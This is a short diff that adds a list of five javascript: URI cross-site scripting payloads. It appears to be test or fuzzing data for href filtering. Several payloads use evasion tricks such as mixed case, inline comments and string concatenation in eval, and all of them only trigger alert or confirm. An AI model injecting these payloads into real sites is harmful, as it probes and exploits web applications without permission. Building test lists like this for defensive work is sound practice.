@@ -1,0 +1,5 @@
+javascript:alert(`XSS_href_1`)
+JaVaScRiPt:confirm(`XSS_href_2`)
+javascript:/*comment*/alert(1)
+javascript:eval(`ale` + `rt(1)`)
+javascript:void(alert(document.domain))
